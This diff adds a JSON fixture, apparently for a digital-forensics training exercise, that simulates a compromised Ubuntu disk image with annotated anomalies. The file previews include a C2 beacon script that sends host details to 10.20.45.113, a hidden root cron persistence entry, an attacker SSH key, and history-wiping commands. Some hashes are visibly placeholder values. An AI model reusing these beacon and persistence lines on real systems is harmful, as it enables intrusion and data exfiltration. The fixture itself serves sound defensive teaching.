@@ -1,0 +1,213 @@
+{
+  "image": {
+    "name": "dc01-disk.dd",
+    "acquired": "2024-11-08T04:30:00",
+    "size_gb": 40,
+    "filesystem": "ext4",
+    "os": "Ubuntu 22.04.3 LTS",
+    "md5": "a3f8d2c1e6b4092f75a31de890bc4521",
+    "sha256": "8d4e9c2f1b7a6e3d5c8f0b2a4e6d8c1f3a5b7d9e0c2f4b6a8d0e2c4f6b8a0d2",
+    "investigator": "Analista BTA",
+    "case": "MOD1-2024-001"
+  },
+  "tree": {
+    "name": "/", "type": "dir",
+    "children": [
+      {
+        "name": "etc", "type": "dir",
+        "children": [
+          {
+            "name": "passwd", "type": "file", "status": "normal",
+            "meta": {
+              "size": 2847, "permissions": "-rw-r--r--",
+              "owner": "root", "group": "root", "inode": 131073,
+              "mtime": "2024-09-15T08:23:41",
+              "atime": "2024-11-08T02:15:33",
+              "ctime": "2024-09-15T08:23:41",
+              "md5": "8e6ccea648f3b6f76a90c538e13c3c21",
+              "sha256": "3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2"
+            },
+            "anomaly": { "level": "normal", "reason": "Timestamps coerentes. Arquivo de sistema padrão sem modificações suspeitas." },
+            "preview": { "type": "text", "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\ndeployer:x:1001:1001:Deployment User:/home/deployer:/bin/bash" }
+          },
+          {
+            "name": "shadow", "type": "file", "status": "normal",
+            "meta": {
+              "size": 1193, "permissions": "-rw-r-----",
+              "owner": "root", "group": "shadow", "inode": 131074,
+              "mtime": "2024-09-15T08:23:41",
+              "atime": "2024-11-08T02:15:34",
+              "ctime": "2024-09-15T08:23:41",
+              "md5": "c8ffe9a587b126f152ed3d89a146b445",
+              "sha256": "1a3f5b7d9e1c3f5b7d9e1c3f5b7d9e1c3f5b7d9e1c3f5b7d9e1c3f5b7d9e1c3f"
+            },
+            "anomaly": { "level": "normal", "reason": "Timestamps coerentes com instalação do sistema operacional." },
+            "preview": { "type": "text", "content": "root:$6$rounds=4096$xK9mPsA2$Ld8fR7jN...:19615:0:99999:7:::\ndaemon:*:19615:0:99999:7:::\nbin:*:19615:0:99999:7:::\nnobody:*:19615:0:99999:7:::\ndeployer:$6$rounds=4096$mP3qL8sA$Kf2rT9jM...:20041:0:99999:7:::" }
+          },
+          {
+            "name": "cron.d", "type": "dir",
+            "children": [
+              {
+                "name": ".update", "type": "file", "status": "critical",
+                "meta": {
+                  "size": 95, "permissions": "-rw-r--r--",
+                  "owner": "root", "group": "root", "inode": 262144,
+                  "mtime": "2025-03-15T12:00:00",
+                  "atime": "2025-03-15T12:00:00",
+                  "ctime": "2024-11-08T02:20:13",
+                  "md5": "4a8a08f09d37b73795649038408b5f8",
+                  "sha256": "5f4dcc3b5aa765d61d8327deb882cf9946f9c1f6a5d5e22b3e7a8b0e4f2c5d8a"
+                },
+                "anomaly": { "level": "critical", "reason": "TIMESTAMP NO FUTURO: mtime=2025-03-15 é posterior à data de aquisição (2024-11-08). O ctime real=2024-11-08T02:20:13 revela criação durante a janela do incidente. Arquivo oculto (prefixo .) em /etc/cron.d estabelece persistência via cron." },
+                "preview": { "type": "text", "content": "# System update service - DO NOT MODIFY\n* * * * * root /tmp/.cache_update > /dev/null 2>&1" }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "name": "tmp", "type": "dir",
+        "children": [
+          {
+            "name": ".cache_update", "type": "file", "status": "critical",
+            "meta": {
+              "size": 15872, "permissions": "-rwxr-xr-x",
+              "owner": "root", "group": "root", "inode": 786432,
+              "mtime": "2024-11-08T02:19:42",
+              "atime": "2024-11-08T03:18:00",
+              "ctime": "2024-11-08T02:19:42",
+              "md5": "4a8a08f09d37b73795649038408b5f8",
+              "sha256": "9c2d4b6e8a0f1c3d5e7b9a0c2d4f6b8a0c2d4f6b8a0c2d4f6e8b0c2d4f6b8ac"
+            },
+            "anomaly": { "level": "critical", "reason": "Executável em /tmp (diretório sem execução esperada). Criado em 02:19:42 durante a janela do incidente. atime=03:18:00 coincide com o primeiro beacon C2 capturado no tráfego de rede. MD5 IDÊNTICO ao /usr/local/bin/svc_update — mesma origem." },
+            "preview": { "type": "binary", "strings": ["ELF", "/lib64/ld-linux-x86-64.so.2", "libcurl.so.4", "/bin/sh", "10.20.45.113", "GET /gate.php HTTP/1.1", "Host: %s:%d", "cmd=exec&id=%s&data=%s", "UPX!", "/tmp/.cache_update", "curl"] }
+          },
+          {
+            "name": "beacon.sh", "type": "file", "status": "critical",
+            "meta": {
+              "size": 312, "permissions": "-rwxr-xr-x",
+              "owner": "root", "group": "root", "inode": 786433,
+              "mtime": "2024-11-08T02:19:55",
+              "atime": "2024-11-08T02:20:01",
+              "ctime": "2024-11-08T02:19:55",
+              "md5": "6f96cffb6e8d8b3d46faf7a48ef0d4a5",
+              "sha256": "b2d4f6a8c0e2f4b6d8a0c2e4f6b8d0a2c4e6f8b0d2a4c6f8e0b2d4a6c8e0f2b"
+            },
+            "anomaly": { "level": "critical", "reason": "Script de beacon C2 em /tmp. Conecta a 10.20.45.113:8080 via HTTP POST a cada 300 segundos. Criado em 02:19:55 durante o incidente. Identificado como dropper do malware svc_update." },
+            "preview": { "type": "text", "content": "#!/bin/bash\n# System cache update service\nC2=\"10.20.45.113\"\nPORT=8080\nwhile true; do\n  curl -s -X POST \"http://$C2:$PORT/gate.php\" \\\n    -d \"id=$(hostname)&cmd=$(uname -a)\" > /dev/null 2>&1\n  sleep 300\ndone" }
+          }
+        ]
+      },
+      {
+        "name": "var", "type": "dir",
+        "children": [
+          {
+            "name": "log", "type": "dir",
+            "children": [
+              {
+                "name": "auth.log", "type": "file", "status": "suspect",
+                "meta": {
+                  "size": 524288, "permissions": "-rw-r-----",
+                  "owner": "syslog", "group": "adm", "inode": 1048576,
+                  "mtime": "2024-11-08T04:15:22",
+                  "atime": "2024-11-08T02:16:30",
+                  "ctime": "2024-11-08T04:15:22",
+                  "md5": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d",
+                  "sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+                },
+                "anomaly": { "level": "suspect", "reason": "atime (02:16:30) é ANTERIOR ao mtime (04:15:22). Logicamente impossível — indica manipulação de timestamps ou acesso ao arquivo antes dos eventos mais recentes serem registrados. O arquivo foi lido pelo atacante para verificar quais eventos haviam sido registrados." },
+                "preview": { "type": "text", "content": "Nov  8 02:14:01 dc01 CRON[1180]: (root) CMD (test -x /usr/sbin/anacron)\nNov  8 02:17:03 dc01 sshd[2341]: Failed password for root from 10.20.45.113 port 52841 ssh2\nNov  8 02:17:09 dc01 sshd[2341]: Failed password for root from 10.20.45.113 port 52841 ssh2\nNov  8 02:17:15 dc01 sshd[2341]: Failed password for root from 10.20.45.113 port 52841 ssh2\nNov  8 02:17:31 dc01 sshd[2341]: Accepted password for deployer from 10.20.45.113 port 52843 ssh2\nNov  8 02:17:31 dc01 sshd[2342]: pam_unix(sshd:session): session opened for user deployer\nNov  8 02:17:45 dc01 sudo[2398]: deployer : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash\nNov  8 02:23:47 dc01 sshd[2342]: pam_unix(sshd:session): session closed for user deployer" }
+              },
+              {
+                "name": "syslog", "type": "file", "status": "normal",
+                "meta": {
+                  "size": 1048576, "permissions": "-rw-r-----",
+                  "owner": "syslog", "group": "adm", "inode": 1048577,
+                  "mtime": "2024-11-08T04:15:30",
+                  "atime": "2024-11-08T04:15:30",
+                  "ctime": "2024-11-08T04:15:30",
+                  "md5": "9b1deb4d3b7d4bad9bdd2b0d7b3d5c8d",
+                  "sha256": "c4a7e9d3f2b1c8a5e6d9f0b3c2a7e4d1f8b5c0a3e6d9f2b5c8a1e4d7f0b3c6a"
+                },
+                "anomaly": { "level": "normal", "reason": "Timestamps coerentes. Conteúdo confirma execução do cron rodando /tmp/.cache_update a partir das 03:00 — evidência corroborante." },
+                "preview": { "type": "text", "content": "Nov  8 02:00:01 dc01 kernel: [84329.412] NET: Registered PF_INET6 protocol family\nNov  8 02:14:01 dc01 CRON[1180]: (root) CMD (anacron)\nNov  8 02:17:32 dc01 kernel: [87151.882] audit: type=1130 audit(1731028652)\nNov  8 03:00:01 dc01 CRON[2488]: (root) CMD (/tmp/.cache_update > /dev/null 2>&1)\nNov  8 03:18:00 dc01 CRON[2612]: (root) CMD (/tmp/.cache_update > /dev/null 2>&1)\nNov  8 03:23:00 dc01 CRON[2698]: (root) CMD (/tmp/.cache_update > /dev/null 2>&1)" }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "name": "home", "type": "dir",
+        "children": [
+          {
+            "name": "deployer", "type": "dir",
+            "children": [
+              {
+                "name": ".bash_history", "type": "file", "status": "suspect",
+                "meta": {
+                  "size": 0, "permissions": "-rw-------",
+                  "owner": "deployer", "group": "deployer", "inode": 1572863,
+                  "mtime": "2024-11-08T02:22:47",
+                  "atime": "2024-11-08T02:22:47",
+                  "ctime": "2024-11-08T02:22:47",
+                  "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                  "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+                },
+                "anomaly": { "level": "suspect", "reason": "Tamanho ZERO bytes — histórico de comandos apagado intencionalmente em 02:22:47, durante a janela do incidente. Indica anti-forense ativa (cat /dev/null > .bash_history ou history -c && history -w). MD5=d41d8cd98f00b204e9800998ecf8427e é o hash de arquivo vazio." },
+                "preview": { "type": "text", "content": "" }
+              },
+              {
+                "name": ".ssh", "type": "dir",
+                "children": [
+                  {
+                    "name": "authorized_keys", "type": "file", "status": "critical",
+                    "meta": {
+                      "size": 381, "permissions": "-rw-------",
+                      "owner": "deployer", "group": "deployer", "inode": 1572864,
+                      "mtime": "2024-11-08T02:21:18",
+                      "atime": "2024-11-08T02:21:18",
+                      "ctime": "2024-11-08T02:21:18",
+                      "md5": "7c4a8d5b2e1f9c3a6d8e0b4f2c7a9e1d",
+                      "sha256": "a4c8d0e2f4b6a8c0e2f4b6d8a0c2e4f6b8d0a2c4e6f8b0d2a4c6e8f0b2d4a6c"
+                    },
+                    "anomaly": { "level": "critical", "reason": "Chave SSH não autorizada adicionada em 02:21:18 durante o incidente. Fornece acesso remoto persistente sem senha ao usuário deployer. Chave identificada como originária de 'root@attacker-kali'. Este vetor de persistência sobrevive a reinicializações e troca de senha." },
+                    "preview": { "type": "text", "content": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7mK9vP2xL+NqR0Ys8HdWf3Jt6mBcV4eXpU1iAzKsNoL5QrTbYgMwE9DvFhZu2cPkOo/SjNx1LmR+Wy7VtA3GqKi8bHfCxDpEo6ZmJlTy/rQ==  root@attacker-kali\n" }
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "name": "usr", "type": "dir",
+        "children": [
+          {
+            "name": "local", "type": "dir",
+            "children": [
+              {
+                "name": "bin", "type": "dir",
+                "children": [
+                  {
+                    "name": "svc_update", "type": "file", "status": "critical",
+                    "meta": {
+                      "size": 32768, "permissions": "-rwxr-xr-x",
+                      "owner": "root", "group": "root", "inode": 2097152,
+                      "mtime": "2024-11-08T02:23:05",
+                      "atime": "2024-11-08T03:18:00",
+                      "ctime": "2024-11-08T02:23:05",
+                      "md5": "4a8a08f09d37b73795649038408b5f8",
+                      "sha256": "9c2d4b6e8a0f1c3d5e7b9a0c2d4f6b8a0c2d4f6b8a0c2d4f6e8b0c2d4f6b8ac"
+                    },
+                    "anomaly": { "level": "critical", "reason": "Binário malicioso instalado em /usr/local/bin. MD5 IDÊNTICO ao /tmp/.cache_update — cópia do mesmo executável. Criado em 02:23:05. atime=03:18:00 coincide com o primeiro beacon C2 capturado na rede. Packed com UPX. Strings confirmam protocolo C2 HTTP para 10.20.45.113:8080." },
+                    "preview": { "type": "binary", "strings": ["ELF", "/lib64/ld-linux-x86-64.so.2", "libcurl.so.4", "/bin/sh", "10.20.45.113", "GET /gate.php HTTP/1.1", "Host: %s:%d", "cmd=exec&id=%s&data=%s", "UPX!", "PROT_EXEC|PROT_WRITE failed", "$Info: packed with UPX http://upx.sf.net $", "/tmp/.cache_update", "svc_update 1.0 - System Update Service"] }
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
